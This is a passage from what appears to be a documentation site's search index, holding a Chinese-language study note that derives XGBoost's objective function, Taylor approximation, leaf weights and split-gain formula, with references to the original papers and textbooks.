\u7684\u76ee\u6807\u51fd\u6570\u7531\u635f\u5931\u51fd\u6570\u548c\u60e9\u7f5a\u51fd\u6570\u7ec4\u6210\uff0c\u8fd9\u4e00\u70b9\u5927\u591a\u6570\u673a\u5668\u5b66\u4e60\u6a21\u578b\u90fd\u5dee\u4e0d\u591a\u3002\u901a\u8fc7\u6700\u5c0f\u5316\u635f\u5931\u51fd\u6570\u6765\u63d0\u9ad8\u9884\u6d4b\u7cbe\u5ea6\uff0c\u5f15\u5165\u60e9\u7f5a\u51fd\u6570\u6765\u63a7\u5236\u6a21\u578b\u590d\u6742\u5ea6\uff0c\u9632\u6b62\u8fc7\u62df\u5408\u3002 Obj = \\sum_{i = 1}^n {l(y_i, \\widehat{y}_{i})} + \\sum_{k = 1}^K \\Omega (f_k) \\tag{6} \u516c\u5f0f (6) \u4e2d\u7684 n \u8868\u793a\u8f93\u5165\u6570\u636e\u7684\u603b\u6570\u76ee\uff0c\u6211\u4eec\u7684\u4f18\u5316\u76ee\u6807\u5c31\u662f\u6700\u5c0f\u5316\u76ee\u6807\u51fd\u6570\u3002 \\min Obj \\tag{7} 4. \u5316\u7b80\u76ee\u6807\u51fd\u6570 # \u6709\u4e86\u76ee\u6807\u51fd\u6570\u4ee5\u540e\uff0c\u6211\u4eec\u8fd8\u6ca1\u6709\u597d\u7684\u529e\u6cd5\u76f4\u63a5\u5bf9\u5b83\u8fdb\u884c\u6c42\u89e3\uff0c\u8fd8\u9700\u8981\u8fdb\u884c\u5316\u7b80\u3002\u56fe5\u662f\u8001\u5e08\u7684PPT\u3002 \\text{Figure 5. Additive Traning} \u56fe5\u7684\u5de6\u534a\u90e8\u5206\u4e3b\u8981\u5728\u89e3\u91caAdditive Traning\uff0c\u548c\u6211\u4eec\u5728 Boosting \u90e8\u5206\u63d0\u5230\u7684\u7c7b\u4f3c\u3002\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u53f3\u534a\u90e8\u5206\u7684\u5316\u7b80\u8fc7\u7a0b\u3002 \u901a\u8fc7\u5c06 \\widehat{y}_{i} \u5c55\u5f00\uff0c\u53bb\u9664\u5e38\u6570\u9879\uff0c\u53ef\u4ee5\u5c06\u76ee\u6807\u51fd\u6570\u5316\u7b80\u4e3a { \\begin{aligned} Obj &= \\sum_{i = 1}^n {l(y_i, \\widehat{y}_{i}^{(k)})} + \\sum_{k = 1}^K \\Omega (f_k) & \\\\ &= \\sum_{i = 1}^n {l(y_i, \\widehat{y}_{i}^{(k-1)} + f_k(\\mathbf{x}_i) )} + \\Omega (f_k) & \\\\ \\end{aligned} } \\tag{8} \u6b64\u5904\u5229\u7528\u4e86\u516c\u5f0f (5) \u5c06 \\widehat{y}_{i}^{(k)} \u4e2d\u524d k-1 \u9879\u5206\u79bb\u4e86\u51fa\u6765\u3002\u56e0\u4e3a\u524d k-1 \u9879\u5df2\u7ecf\u5728\u5404\u81ea\u7684\u8bad\u7ec3\u8fc7\u7a0b\u4e2d\u4f18\u5316\u8fc7\u4e86\uff0c\u5728\u8fd9\u91cc\u53ef\u4ee5\u89c6\u4e3a\u5e38\u6570\u9879\uff0c\u6240\u4ee5\u6211\u4eec\u5c06\u60e9\u7f5a\u51fd\u6570\u4e2d\u7684\u524d k-1 \u9879\u53bb\u9664\uff0c\u4ec5\u8003\u8651\u8981\u4f18\u5316\u7684 f_k \u90e8\u5206\u3002 5. \u4f7f\u7528\u6cf0\u52d2\u7ea7\u6570\u8fd1\u4f3c\u76ee\u6807\u51fd\u6570 # \u5c3d\u7ba1\u6211\u4eec\u5bf9\u76ee\u6807\u51fd\u6570\u8fdb\u884c\u4e86\u5316\u7b80\uff0c\u4f46\u76f4\u63a5\u5bf9\u76ee\u6807\u51fd\u6570\u8fdb\u884c\u6c42\u89e3\uff0c\u8fd0\u7b97\u7684\u590d\u6742\u5ea6\u4f1a\u975e\u5e38\u9ad8\uff0c\u6240\u4ee5\u6211\u4eec\u9009\u62e9\u5bf9\u76ee\u6807\u51fd\u6570\u8fdb\u884c\u4e8c\u7ea7\u6cf0\u52d2\u5c55\u5f00\uff0c\u63d0\u9ad8\u6a21\u578b\u7684\u8bad\u7ec3\u901f\u5ea6\u3002 \\text{Figure 6. Taylor Expansion} \u6839\u636e\u516c\u5f0f (9) \u4e2d\u7684\u4e8c\u7ea7\u6cf0\u52d2\u5c55\u5f00\u5f0f\u3002 f(x + \\Delta x) \\approx f(x) + f'(x) \\cdot \\Delta x + \\frac{1}{2} f''(x) \\cdot \\Delta x^2 \\tag{9} \u5bf9\u76ee\u6807\u51fd\u6570\u8fdb\u884c\u5c55\u5f00\uff1a { \\begin{aligned} Obj &= \\sum_{i = 1}^n {l(y_i, \\widehat{y}_{i}^{(k-1)} + f_k(\\mathbf{x}_i) )} + \\Omega (f_k) & \\\\ &= \\sum_{i=1}^{n}\\left[l\\left(y_{i}, \\hat{y}^{(k-1)}\\right)+g_{i} f_{k}\\left(\\mathbf{x}_{i}\\right)+\\frac{1}{2} h_{i} f_{k}^{2}\\left(\\mathbf{x}_{i}\\right)\\right]+\\Omega\\left(f_{k}\\right) &\\\\ \\end{aligned} } \\tag{10} \u5176\u4e2d g_{i}=\\partial_{\\hat{y}(k-1)} l\\left(y_{i}, \\hat{y}^{(k-1)}\\right) \u4e14 h_{i}=\\partial_{\\hat{y}(k-1)}^{2} l\\left(y_{i}, \\hat{y}^{(k-1)}\\right) \uff0c \u5bf9\u5e94\u4e8c\u7ea7\u6cf0\u52d2\u5c55\u5f00\u5f0f\u4e2d\u7684\u4e00\u9636\u5bfc\u6570\u548c\u4e8c\u9636\u5bfc\u6570\uff0c\u7531\u4e8e\u5b83\u4eec\u90fd\u662f\u57fa\u4e8e\u524d k - 1 \u4e2a\u6a21\u578b\u7684\uff0c\u6240\u4ee5\u5728\u8bad\u7ec3\u7b2c k \u4e2a\u6a21\u578b\u65f6\u4e5f\u662f\u5df2\u77e5\u7684\uff0c\u53ef\u4ee5\u89c6\u4e3a\u5e38\u6570\u9879\u3002 \u516c\u5f0f (10) \u4e2d\uff0c l(y_{i}, \\hat{y}^{(k-1)}) \u4e5f\u53ef\u89c6\u4e3a\u5e38\u6570\u9879\uff0c\u5e76\u4e14\u8fd9\u4e00\u9879\u6ca1\u6709\u548c\u53d8\u91cf f_k(\\mathbf{x}_i) \u76f8\u4e58\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c06\u5c55\u5f00\u540e\u7684\u76ee\u6807\u51fd\u6570\u518d\u6b21\u8fdb\u884c\u5316\u7b80\uff0c\u7ed3\u679c\u4e3a\uff1a Obj =\\sum_{i=1}^{n}\\left[g_{i} f_{k}\\left(\\mathbf{x}_{i}\\right)+\\frac{1}{2} h_{i} f_{k}^{2}\\left(\\mathbf{x}_{i}\\right)\\right]+\\Omega\\left(f_{k}\\right) \\tag{11} 6. \u6a21\u578b\u53c2\u6570\u5316 # \u5728\u516c\u5f0f (5) \u4e2d \uff0c\u6211\u4eec\u63d0\u5230 f_k(\\mathbf{x}_i) \u8868\u793a\u7b2c k \u9897\u6811\u5bf9\u7b2c i \u4e2a\u8f93\u5165\u5411\u91cf\u7684\u9884\u6d4b\u8f93\u51fa\u3002\u90a3\u4e48\u6211\u4eec\u53c8\u5e94\u8be5\u5982\u4f55\u5728\u516c\u5f0f\u4e2d\u5c06 f_k(\\mathbf{x}_i) \u5c55\u5f00\uff0c\u4ece\u800c\u8fdb\u884c\u8bad\u7ec3\u548c\u8c03\u4f18\uff0c\u6700\u7ec8\u8fbe\u5230\u4f18\u5316\u6a21\u578b\u7684\u76ee\u7684\u5462\u3002\u8fd9\u91cc\u6211\u4eec\u5c31\u9700\u8981\u5c06\u6a21\u578b\u53c2\u6570\u5316\uff0c\u5c06\u95ee\u9898\u8f6c\u5316\u4e3a\u53c2\u6570\u4f18\u5316\u7684\u95ee\u9898\u3002 \u90a3\u4e48\u6211\u4eec\u8fd9\u4e00\u8282\u8981\u89e3\u51b3\u7684\u5b50\u95ee\u9898\u5c31\u662f\uff0c\u5982\u4f55\u7528\u53c2\u6570\u7684\u5f62\u5f0f\u6765\u8868\u793a\u4e00\u9897\u51b3\u7b56\u6811\uff0c\u6216\u8005\u8bf4\uff0c\u5982\u4f55\u5c06\u51b3\u7b56\u6811\u7684\u6a21\u578b\u53c2\u6570\u5316\u3002 \u6211\u4eec\u53c2\u8003\u5468\u5fd7\u534e\u8001\u5e08 \u300a\u673a\u5668\u5b66\u4e60\u300b 3 \u4e66\u4e2d\u7684\u4e00\u4e2a\u4f8b\u5b50\u3002 graph TD A[\u7eb9\u7406] -->|\u6e05\u6670| B[\u5bc6\u5ea6 <= 0.381?] B --> |\u662f|C[\u574f\u74dc1] B --> |\u5426|D[\u597d\u74dc2] A[\u7eb9\u7406] -->|\u7a0d\u7cca| E[\u89e6\u611f=?] E --> |\u786c\u6ed1|F[\u574f\u74dc3] E --> |\u8f6f\u7c98|G[\u597d\u74dc4] A[\u7eb9\u7406] -->|\u6a21\u7cca| H[\u574f\u74dc5] \\text{Figure 7. Decision Tree} \u8bbe \\widehat{y}_i = 1 \u8868\u793a\u6a21\u578b\u9884\u6d4b\u7b2c i \u4e2a\u74dc\u4e3a\u597d\u74dc\uff0c \\widehat{y}_i = 0 \u8868\u793a\u6a21\u578b\u9884\u6d4b\u7b2c i \u4e2a\u74dc\u4e3a\u574f\u74dc\u3002\u53f6\u5b50\u8282\u70b9\u6807\u7b7e\u540e\u7684\u6570\u5b57\u4e3a\u53f6\u5b50\u8282\u70b9\u7684\u6807\u53f7\u3002 \u8bbe I_j = \\{i | q(\\mathbf{x}_{i}) = j\\} \u4e3a\u88ab\u5206\u5230\u7b2c j \u4e2a\u53f6\u5b50\u8282\u70b9\u4e2d\u7684 \\mathbf{x}_{i} \u7684\u5e8f\u53f7\u96c6\u5408\u3002 q(\\mathbf{x}_{i}) \u4e3a\u8f93\u5165 \\mathbf{x}_{i} \u5230\u53f6\u5b50\u8282\u70b9\u5e8f\u53f7\u7684\u6620\u5c04\u3002 \u8bbe w_j = \\alpha (j) \u4e3a\u7b2c j \u4e2a\u53f6\u5b50\u8282\u70b9\u7684 \\widehat{y} \u503c\u3002\u53d6\u6837\u4f8b\u6570\u636e\u8fdb\u884c\u8bf4\u660e\uff1a \\text{Table 1. Sample Data} \u5e8f\u53f7 \u7eb9\u7406 \u89e6\u611f \u5bc6\u5ea6 \u597d\u74dc 1 \u6e05\u6670 \u786c\u6ed1 0.697 \u662f 2 \u6e05\u6670 \u8f6f\u7c98 0.267 \u5426 3 \u7a0d\u7cca \u786c\u6ed1 0.091 \u5426 \u5219 { \\begin{aligned} f_k(\\mathbf{x}_{1}) = \\alpha (q(\\mathbf{x}_{1})) =\\alpha(2)=1 = w_2 & \\\\ f_k(\\mathbf{x}_{2}) = \\alpha (q(\\mathbf{x}_{2})) =\\alpha(1)=0 = w_1 & \\\\ f_k(\\mathbf{x}_{3}) = \\alpha (q(\\mathbf{x}_{3})) =\\alpha(3)=0 = w_3 & \\\\ \\end{aligned} } \u6839\u636e\u4e0a\u9762\u7684\u5b9a\u4e49\uff0c\u6211\u4eec\u7ee7\u7eed\u5bf9\u76ee\u6807\u51fd\u6570\u8fdb\u884c\u5316\u7b80\u3002 \u9996\u5148\u5c55\u5f00\u60e9\u7f5a\u51fd\u6570: \\Omega(f)=\\gamma T+\\frac{1}{2} \\lambda\\|w\\|^{2} \\tag{12} \\begin{aligned} Obj &=\\sum_{i=1}^{n}\\left[g_{i} f_{k}\\left(\\mathbf{x}_{i}\\right)+\\frac{1}{2} h_{i} f_{k}^{2}\\left(\\mathbf{x}_{i}\\right)\\right]+\\gamma T+\\frac{1}{2} \\lambda \\sum_{j=1}^{T} w_{j}^{2}\\\\ \\end{aligned} \\tag{13} \u516c\u5f0f (12) \u4e2d \\gamma \u4e3a\u6811\u7684\u6df1\u5ea6\uff0c T \u4e3a\u53f6\u5b50\u8282\u70b9\u4e2a\u6570\uff0c \\lambda \u4e3a\u60e9\u7f5a\u9879\u7cfb\u6570\u3002 \\|w\\|^{2} \u4e3aL2\u6b63\u5219\u5316\u9879\u3002\u516c\u5f0f (13) \u4e3a\u5c06\u60e9\u7f5a\u51fd\u6570\u5e26\u5165\u540e\u7684\u76ee\u6807\u51fd\u6570\u3002 \u4e0b\u9762\u5c06 f_{k}\\left(\\mathbf{x}_{i}\\right) \u4ece\u5bf9\u6bcf\u4e00\u9879\u8f93\u5165\u6570\u636e\u7684\u8f93\u51fa\u6c42\u548c\uff0c\u8f6c\u4e3a\u5bf9\u6bcf\u4e00\u4e2a\u53f6\u5b50\u8282\u70b9\u7684\u8f93\u51fa\u6c42\u548c\u3002 Obj=\\sum_{j=1}^{T}\\left[\\left(\\sum_{i \\in I_{j}} g_{i}\\right) w_{j}+\\frac{1}{2}\\left(\\sum_{i \\in I_{j}} h_{i}+\\lambda\\right) w_{j}^{2}\\right]+\\gamma T \\tag{14} \u516c\u5f0f (14) \u4e2d I_j = \\{i | q(\\mathbf{x}_{i}) = j\\} \u662f\u88ab\u5206\u5230\u7b2c j \u4e2a\u53f6\u5b50\u8282\u70b9\u4e2d\u7684 \\mathbf{x}_{i} \u7684\u5e8f\u53f7\u96c6\u5408\u3002 7. \u5bfb\u627e\u6700\u4f73\u5206\u88c2\u70b9 # \u6211\u4eec\u5047\u8bbe\u6811\u7684\u7ed3\u6784 q(\\mathbf{x}_{i}) \u662f\u786e\u5b9a\u7684\uff0c\u5373\u516c\u5f0f (13) \u4e2d\uff0c \\gamma \u548c T \u4e24\u4e2a\u53c2\u6570\u662f\u786e\u5b9a\u7684\uff0c I_j \u4e5f\u662f\u786e\u5b9a\u7684\uff0c\u5269\u4e0b\u7684\u81ea\u53d8\u91cf\u5c31\u53ea\u6709 w_j^2 \uff0c\u6211\u4eec\u5c31\u5f97\u5230\u4e86\u4e00\u4e2a\u4e00\u5143\u4e8c\u6b21\u65b9\u7a0b\u3002 \u8981\u4f7f\u8fd9\u4e2a\u4e00\u5143\u4e8c\u6b21\u65b9\u7a0b\u6700\u5c0f\uff0c\u6211\u4eec\u5c31\u9700\u8981\u627e\u5230\u5b83\u7684\u6781\u503c\u70b9\u3002 \u9996\u5148\u8003\u8651\u4e8c\u6b21\u9879\u7cfb\u6570\u7684\u6b63\u8d1f\u6027\u3002 \\lambda \u662f\u60e9\u7f5a\u9879\u7cfb\u6570\uff0c\u662f\u975e\u8d1f\u7684\uff0c\u800c h_{i}=\\partial_{\\hat{y}(k-1)}^{2} l\\left(y_{i}, \\hat{y}^{(k-1)}\\right) \uff0c\u662f\u635f\u5931\u51fd\u6570\u7684\u4e8c\u9636\u5bfc\u6570\u3002 \u6211\u4eec\u53c2\u8003 \u300a\u795e\u7ecf\u7f51\u7edc\u4e0e\u6df1\u5ea6\u5b66\u4e60\u300b 4 \u4e2d\u7ed9\u51fa\u7684\u5e38\u7528\u635f\u5931\u51fd\u6570\u3002 \\text{Figure 8. Loss Function} XGBoost \u5e38\u7528\u7684\u662f\u5e73\u65b9\u635f\u5931\uff0c\u5b83\u7684\u4e8c\u9636\u5bfc\u51fd\u6570\u6052\u4e3a\u6b63\u6570\u3002\u6240\u4ee5\u76ee\u6807\u51fd\u6570\u4e8c\u6b21\u9879\u7cfb\u6570\u4e5f\u6052\u4e3a\u6b63\u3002 \u6240\u4ee5\u6211\u4eec\u6839\u636e\u4e00\u5143\u4e8c\u6b21\u65b9\u7a0b\u7684\u6027\u8d28\uff0c\u6c42\u89e3\u76ee\u6807\u51fd\u6570\u7684\u6700\u5c0f\u503c\u3002 w_{j}^{*}=-\\frac{\\sum_{i \\in I_{j}} g_{i}}{\\sum_{i \\in I_{j}} h_{i}+\\lambda} \\tag{15} \u5e26\u5165\u516c\u5f0f (14) \u53ef\u6c42\u5f97 Obj(q)=-\\frac{1}{2} \\sum_{j=1}^{T} \\frac{\\left(\\sum_{i \\in I_{j}} g_{i}\\right)^{2}}{\\sum_{i \\in I_{j}} h_{i}+\\lambda}+\\gamma T \\tag{16} \u516c\u5f0f (16) \u4e2d q \u4e3a\u67d0\u4e00\u786e\u5b9a\u7684\u6811\u7ed3\u6784\u3002 Obj(q) \u53ef\u4ee5\u4f5c\u4e3a\u8bc4\u5206\u51fd\u6570\uff0c\u7528\u6765\u8ba1\u7b97\u6811\u7ed3\u6784\u7684\u5f97\u5206\u3002\u7c7b\u4f3c\u4e8e\u51b3\u7b56\u6811\u6a21\u578b\u4e2d\u7684\u4fe1\u606f\u71b5(Information Entropy)\u3002 \u7531\u4e8e\u904d\u5386\u6240\u6709\u7684\u6811\u7ed3\u6784\u662f\u4e00\u4e2a NP \u95ee\u9898\uff0c\u6240\u4ee5 XGBoost \u91c7\u7528\u4e86\u8d2a\u5fc3\u7b97\u6cd5\u6765\u6c42\u5f97\u6811\u7ed3\u6784\u7684\u5c40\u90e8\u6700\u4f18\u89e3\u3002 \u5047\u8bbe I_L \u548c I_R \u662f\u5206\u5272\u540e\u7684\u5de6\u8282\u70b9\u548c\u53f3\u8282\u70b9\u7684 \\mathbf{x}_{i} \u7684\u5e8f\u53f7\u96c6\u5408\uff0c I = I_L \\bigcup I_R \uff0c\u90a3\u4e48\u6bcf\u6b21\u5206\u88c2\u540e Obj(q) \u7684\u51cf\u5c11\u503c\u4e3a\uff1a \\mathcal{L}_{s p l i t}=\\frac{1}{2}\\left[\\frac{\\left(\\sum_{i \\in I_{L}} g_{i}\\right)^{2}}{\\sum_{i \\in I_{L}} h_{i}+\\lambda}+\\frac{\\left(\\sum_{i \\in I_{R}} g_{i}\\right)^{2}}{\\sum_{i \\in I_{R}} h_{i}+\\lambda}-\\frac{\\left(\\sum_{i \\in I} g_{i}\\right)^{2}}{\\sum_{i \\in I} h_{i}+\\lambda}\\right]-\\gamma \\tag{17} \u8fd9\u4e2a\u516c\u5f0f\u53ef\u4ee5\u7528\u6765\u641c\u7d22\u6700\u4f73\u7684\u5206\u88c2\u70b9\uff0c\u7c7b\u4f3c\u4e8e\u51b3\u7b56\u6811\u4e2d\u7684\u4fe1\u606f\u589e\u76ca(Information Gain)\u3002 \u63a5\u4e0b\u6765\u7684\u8fc7\u7a0b\u5c31\u548c\u4e00\u822c\u7684\u51b3\u7b56\u6811\u8bad\u7ec3\u8fc7\u7a0b\u7c7b\u4f3c\u4e86\uff0c\u8bba\u6587\u4e2d\u4e5f\u7ed9\u4e86\u4e24\u4e2a\u641c\u7d22\u6700\u4f73\u5206\u88c2\u70b9\u7684\u7b97\u6cd5\uff0c\u6211\u4eec\u5c31\u4e0d\u505a\u8be6\u7ec6\u8ba8\u8bba\u4e86\u3002 \\text{Figure 9. Algorithm 1} \\text{Figure 10. Algorithm 2} XGBoost \u4e3b\u8981\u7684\u5185\u5bb9\u5927\u6982\u5c31\u662f\u8fd9\u4e9b\uff0c\u5e0c\u671b\u4e86\u89e3\u66f4\u52a0\u8be6\u7ec6\u5185\u5bb9\u7684\u540c\u5b66\u53ef\u4ee5\u67e5\u770b \u539f\u59cb\u8bba\u6587 \u3002 8. \u53c2\u8003\u6587\u732e # [1] T. Chen, C. Guestrin, Xgboost: A scalable tree boosting system, CoRR abs/1603.02754. arXiv:1603.02754. [2] J. Friedman, Greedy function approximation: A gradient boosting machine, The Annals of Statistics 29. doi:10.1214/aos/1013203451. [3] \u5468\u5fd7\u534e, \u673a\u5668\u5b66\u4e60, no. 84-85, \u6e05\u534e\u5927\u5b66\u51fa\u7248\u793e, 2016. [4] \u90b1\u9521\u9e4f, \u795e\u7ecf\u7f51\u7edc\u4e0e\u6df1\u5ea6\u5b66\u4e60, no. 74, Github, 2020. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.XGBoost\u539f\u7406\u7b80\u4ecb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/1.XGBoost%E5%8E%9F%E7%90%86%E7%AE%80%E4%BB%8B/#xgboost","text":"","title":"XGBoost\u539f\u7406\u7b80\u4ecb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/1.XGBoost%E5%8E%9F%E7%90%86%E7%AE%80%E4%BB%8B/#_1","text":"XGBoost\u539f\u7406\u7b80\u4ecb \u76ee\u5f55 1. \u80cc\u666f 2. Boosting 2.1. \u5efa\u7acb\u6620\u5c04 2.2. \u8ba1\u7b97\u53c2\u6570 3. XGBoost\u7684\u76ee\u6807\u51fd\u6570 4. \u5316\u7b80\u76ee\u6807\u51fd\u6570 5. \u4f7f\u7528\u6cf0\u52d2\u7ea7\u6570\u8fd1\u4f3c\u76ee\u6807\u51fd\u6570 6. \u6a21\u578b\u53c2\u6570\u5316 7. \u5bfb\u627e\u6700\u4f73\u5206\u88c2\u70b9 8. \u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/1.XGBoost%E5%8E%9F%E7%90%86%E7%AE%80%E4%BB%8B/#1","text":"\u4eca\u5929\u542c\u4e86 \u8d2a\u5fc3\u5b66\u9662 \u4e3b\u529e\uff0c\u674e\u6587\u54f2\u8001\u5e08\u4e3b\u8bb2\u7684 \u300aXGBoost\u7684\u6280\u672f\u5256\u6790\u300b\u76f4\u64ad \uff0c\u8ba9\u6211\u5bf9XGB\u7684\u539f\u7406\u6709\u4e86\u4e00\u4e9b\u4e86\u89e3\u3002\u4e8e\u662f\u6211\u60f3\u5199\u4e00\u7bc7\u7b14\u8bb0\u6574\u7406\u4e00\u4e0b\u542c\u8bfe\u7684\u5185\u5bb9\u3002 \u8001\u5e08\u8bb2\u5f97\u633a\u901a\u4fd7\u6613\u61c2\u7684\uff0c\u4e0d\u8fc7\u7531\u4e8eXGB\u672c\u8eab\u5177\u6709\u4e00\u5b9a\u7684\u590d\u6742\u6027\uff0c\u8981\u770b\u61c2\u8fd9\u7bc7\u7b14\u8bb0\u9700\u8981\u6709\u5982\u4e0b\u7684\u80cc\u666f\u77e5\u8bc6\uff1a \u51b3\u7b56\u6811\u7684\u539f\u7406 \u6cf0\u52d2\u7ea7\u6570 \u635f\u5931\u51fd\u6570 \u60e9\u7f5a\u51fd\u6570 \u5982\u679c\u5bf9\u8fd9\u4e9b\u6982\u5ff5\u4e0d\u592a\u4e86\u89e3\uff0c\u63a8\u8350\u9605\u8bfb\u590d\u65e6\u5927\u5b66\u90b1\u9521\u9e4f\u8001\u5e08\u7684\u5f00\u6e90\u4e66 \u300a\u795e\u7ecf\u7f51\u7edc\u4e0e\u6df1\u5ea6\u5b66\u4e60\u300b \u8fd8\u6709\u4eba\u6c11\u90ae\u7535\u51fa\u7248\u793e\u7684 \u300a\u673a\u5668\u5b66\u4e60\u5b9e\u6218\u300b \uff0c\u6cf0\u52d2\u7ea7\u6570\u53ef\u4ee5\u53c2\u8003\u9ad8\u6570\u8bfe\u672c\u548c\u7f51\u7edc\u8d44\u6599\u3002","title":"1. \u80cc\u666f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/1.XGBoost%E5%8E%9F%E7%90%86%E7%AE%80%E4%BB%8B/#2-boosting","text":"\u4ece XGBoost \u8fd9\u4e2a\u540d\u5b57\u5c31\u80fd\u770b\u51fa\u6765\uff0c\u8fd9\u4e2a\u6a21\u578b\u4f7f\u7528\u4e86 Boosting \u7684\u65b9\u6cd5\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u6765\u5148\u4e86\u89e3\u4e00\u4e0b Boosting \u5b83\u662f\u4e2a\u5565\u73a9\u610f\u513f\u3002 \\text{Figure 1. Bagging vs Boosting} \u8001\u5e08\u7684PPT\u4e2d\u5bf9\u6bd4\u4e86 Bagging \u548c Boosting \u4e24\u79cd\u5e38\u7528\u7684\u96c6\u6210\u5b66\u4e60\u65b9\u6cd5\u3002 Bagging \uff1a\u5229\u7528\u591a\u4e2a\u8fc7\u62df\u5408\u7684\u5f31\u5b66\u4e60\u5668\u6765\u83b7\u5f97\u66f4\u597d\u7684\u6548\u679c\u3002\u5178\u578b\u7684\u7b97\u6cd5\u6709\u968f\u673a\u68ee\u6797\u3002 Boosting \uff1a\u5229\u7528\u591a\u4e2a\u6b20\u62df\u5408\u7684\u5f31\u5b66\u4e60\u5668\u6765\u83b7\u5f97\u66f4\u597d\u7684\u6548\u679c\u3002\u5178\u578b\u7684\u7b97\u6cd5\u6709GBDT/GBRT\uff0cAdaboost\uff0cXGBoost\u548cLightGBM\u3002 Boosting \u672c\u8eab\u5728\u4e0d\u540c\u7b97\u6cd5\u4e2d\u7684\u5177\u4f53\u5e94\u7528\u4e5f\u4e0d\u5b8c\u5168\u76f8\u540c\uff0c\u800c\u4ece XGBoost 1 \u7684 \u8bba\u6587 \u4e2d\u6211\u4eec\u80fd\u591f\u4e86\u89e3\u5230\uff0c\u5b83\u4e3b\u8981\u501f\u9274\u4e86 GBDT \u7684 Boosting \u65b9\u6cd5 \u4e3a\u4e86\u52a0\u6df1\u5bf9 Boosting \u7684\u4e86\u89e3\uff0c\u6211\u628a GBDT 2 \u7684 \u8bba\u6587 \u4e5f\u627e\u51fa\u6765\u770b\u4e86\u4e00\u4e0b\u3002","title":"2. Boosting"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/1.XGBoost%E5%8E%9F%E7%90%86%E7%AE%80%E4%BB%8B/#21","text":"\u9996\u5148\uff0c\u6211\u4eec\u901a\u8fc7\u516c\u5f0f (1) \u5efa\u7acb\u4ece \\mathbf{x} \u5230 y \u7684\u6620\u5c04\u3002 \\widehat{y} = F\\left(\\mathbf{x} ;\\left\\{\\beta_{m}, \\mathbf{a}_{m}\\right\\}_{1}^{M}\\right)=\\sum_{m=1}^{M} \\beta_{m} h\\left(\\mathbf{x} ; \\mathbf{a}_{m}\\right) \\tag{1} \u8fd9\u91cc\u7684 \\mathbf{x} \u548c \\mathbf{a}_{m} \u7528\u7c97\u4f53\u663e\u793a\uff0c\u8868\u793a\u5b83\u4eec\u90fd\u662f\u5411\u91cf\uff0c \\widehat{y} \u8868\u793a\u6a21\u578b\u7684\u9884\u6d4b\u503c\u3002 \u516c\u5f0f (1) \u4e2d\u7684 h\\left(\\mathbf{x} ; \\mathbf{a}_{m}\\right) \u8868\u793a\u4e00\u4e2a\u4e2a\u5f31\u5206\u7c7b\u5668\uff0c \\mathbf{a}_{m} \u662f\u5f31\u5206\u7c7b\u5668\u7684\u53c2\u6570\uff0c \\beta_m \u662f\u5176\u6743\u91cd\uff0c \\left\\{\\beta_{m}, \\mathbf{a}_{m}\\right\\}_{1}^{M} \u662f \\mathbf{a}_{m} \u548c \\beta_m \u7684 M \u4e2a\u7ec4\u5408\u3002 M \u8868\u793a\u5f31\u5206\u7c7b\u5668\u7684\u6570\u91cf\u3002 \u516c\u5f0f (1) \u8868\u793a GBDT \u662f\u901a\u8fc7\u5bf9\u591a\u4e2a\u5f31\u5206\u7c7b\u5668\u7ed3\u679c\u8fdb\u884c\u7ebf\u6027\u52a0\u6743\u6c42\u548c\u4ece\u800c\u6c42\u51fa\u6700\u7ec8\u7ed3\u679c\u7684\u3002","title":"2.1. \u5efa\u7acb\u6620\u5c04"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/1.XGBoost%E5%8E%9F%E7%90%86%E7%AE%80%E4%BB%8B/#22","text":"\u5efa\u7acb\u4e86 \\mathbf{x} \u5230 y \u7684\u6620\u5c04\u4e4b\u540e\uff0c\u6211\u4eec\u5c31\u9700\u8981\u8003\u8651\u5982\u4f55\u53bb\u8ba1\u7b97\u51fd\u6570\u4e2d\u7684\u53c2\u6570\u3002 \\left(\\beta_{m}, \\mathbf{a}_{m}\\right)=\\arg \\min _{\\beta, \\mathbf{a}} \\sum_{i=1}^{N} L\\left(y_{i}, F_{m-1}\\left(\\mathbf{x}_{i}\\right)+\\beta h\\left(\\mathbf{x}_{i} ; \\mathbf{a}\\right)\\right) \\tag{2} \u516c\u5f0f (2) \u4e2d\uff0c \\displaystyle\\arg \\min _{\\beta, \\mathbf{a}} \u8868\u793a\u4f7f\u5176\u53f3\u8fb9\u7684\u8868\u8fbe\u5f0f\u6700\u5c0f\u7684 (\\beta, \\mathbf{a}) \u7ec4\u5408\uff0c L(y_i, \\hat{y_i}) \u4e3a\u635f\u5931\u51fd\u6570\u3002 \u516c\u5f0f (2) \u8bf4\u660e\u53c2\u6570 \\left(\\beta_{m}, \\mathbf{a}_{m}\\right) 